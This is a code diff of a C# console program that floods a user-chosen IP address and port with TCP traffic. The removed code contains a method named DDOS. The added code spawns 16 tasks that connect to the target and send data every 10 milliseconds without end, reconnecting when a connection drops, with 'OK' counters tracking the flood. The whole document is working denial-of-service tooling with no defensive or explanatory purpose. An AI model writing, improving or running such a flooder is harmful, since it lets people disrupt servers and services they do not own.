@@ -8,13 +8,13 @@ using System.Text.RegularExpressions;
 using System.Security.Cryptography;
 using System.Diagnostics.Tracing;
 using System.Diagnostics;
+using System.Globalization;
 
 class Program
 {
     public static string? IP;
     public static int Port;
     public static int count = 0;
-    public static int isErr = 0;
     public static Socket? socket;
     static async Task Main()
     {
@@ -48,63 +48,44 @@ class Program
                 Console.ResetColor();
             }
         }
-        for (int i = 0; i < 32; i++)
+        for (int i = 0; i < 16; i++)
         {
-            Thread t = new(DDOS);
-            t.Start();
-        }
-    }
-    static async void DDOS()
-    {
-    reclient:
-        socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        socket.Connect(IP, Port);
-        while (true)
-        {
-            count++;
-
-            Thread s = new(SendPackage);
-            s.Start();
-            Console.Clear();
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.Write("OK");
-            Console.ResetColor();
-            Console.Write("\u0020time ="+ count);
-
-            if(isErr == 1)
+            Console.WriteLine("Thread\u0020"+i+"\u0020starts.");
+            Task.Run(() =>
             {
-                Console.Clear();
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.Write("错误: ERROR At\u0020" + count + "\u0020turns.");
-                Console.ResetColor();
-                socket = null;
-                isErr = 0;
-                goto reclient;
-            }
+                socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                socket.Connect(IP, Port);
+                while (true)
+                {
+                    Thread.Sleep(10);
+                    Task.Run(() =>
+                    {
+                        byte[] data = Encoding.UTF8.GetBytes("DataDataDataDataDataDataDataData");
+                        try
+                        {
+                            socket.Send(data);
+                            Console.Clear();
+                            Console.ForegroundColor = ConsoleColor.Green;
+                            Console.Write("OK");
+                            Console.ResetColor();
+                            Console.Write("\u0020time =" + count++);
+                        }
+                        catch (Exception)
+                        {
+                            Console.Clear();
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.Write("错误: ERROR At\u0020" + count++ + "\u0020turns.");
+                            Console.ResetColor();
+                            socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                            socket.Connect(IP, Port);
+                        }
+                        return;
+                    });
+                }
+            });
         }
-    }
-    static void SendPackage()
-    {
-        int rs = 2048;
-        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
-        StringBuilder rd = new(rs);
-        Random random = new();
-        for (int i = 0; i < rs; i++)
-        {
-            rd.Append(chars[random.Next(chars.Length)]);
-        }
-        byte[] data = Encoding.UTF8.GetBytes(rd.ToString());
-
-        try
-        {
-            socket.Send(data);
-            isErr = 0;
-            Environment.Exit(0);
-        }
-        catch(Exception)
-        {
-            isErr = 1;
-            Environment.Exit(0);
+        while(true) {
+            Task.WaitAll();
         }
     }
 }
